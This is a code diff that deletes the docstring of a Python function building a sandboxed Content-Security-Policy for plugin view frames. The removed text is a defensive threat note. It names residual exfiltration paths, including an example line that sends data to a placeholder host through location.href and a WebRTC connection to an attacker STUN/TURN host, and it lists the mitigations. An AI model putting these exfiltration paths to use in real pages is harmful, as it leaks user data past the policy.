@@ -36,23 +36,6 @@ def build_csp(script_src_extra: str = "", frame_ancestors: str = "", overrides: 
 
 
 def build_view_csp(base: str) -> str:
-    """The policy one plugin view answers (A15, epic #2063): nothing by default, scripts, styles and fonts from the view's own path only.
-
-    Inputs: base (str): the view's absolute request prefix with scheme and host, ending in ``/`` (``http://127.0.0.1:5001/api/v1/cplugs/pet/view/walk/<ticket>/``).
-    Output: str. ``connect-src 'none'`` (no fetch, XHR, WebSocket), ``frame-ancestors 'self'`` (only the app frames it) and ``sandbox allow-scripts``
-    (an opaque origin even if the response is opened as a page: no cookies, storage or parent access). Images may be the view's own, ``data:`` or ``blob:``.
-
-    RESIDUAL RISK (named, not closed by this header): ``connect-src 'none'`` covers fetch, XHR, WebSocket and EventSource only. A view can still
-    leave through (1) self-navigation (``location.href = "https://x/?" + data``; the sandbox allows it and no directive covers top-level-of-frame
-    navigation) and (2) WebRTC (``RTCPeerConnection`` to an attacker STUN/TURN host). So "no network" is a policy goal, not a proof. What backs it:
-    the frame holds no secret (opaque origin, no cookies or storage), the nonce goes only to the first document and the host unmounts the frame the
-    moment it loads a second one (``web/src/lib/cplug-ui/bridge.ts``), and the view is the plugin's own declared, reviewed code. The Electron
-    wrapper refuses it with ``will-frame-navigate`` (``macOS/window-host.js``: a subframe may only navigate inside the app origin), which closes (1) in the desktop app and
-    leaves it open in a plain browser tab. The PANEL surface (#2184) re-decides the "holds no secret" premise: its frame may take keyboard
-    focus, so a view could draw a fake prompt and read typing. That is why a panel gets focus only after the user's click on a host-drawn
-    gate over the frame (``web/src/lib/cplug-ui/ViewFrame.svelte``, ``focus-return.ts``), and an overlay never gets it.
-    Example: build_view_csp("http://h/v/").startswith("default-src 'none'; script-src http://h/v/;")
-    """
     return build_csp(overrides={"default-src": "'none'", "script-src": base, "style-src": f"{base} 'unsafe-inline'", "connect-src": "'none'",
                                 "font-src": base, "frame-ancestors": FRAME_ANCESTORS_SELF}, extra=("sandbox allow-scripts",))
 
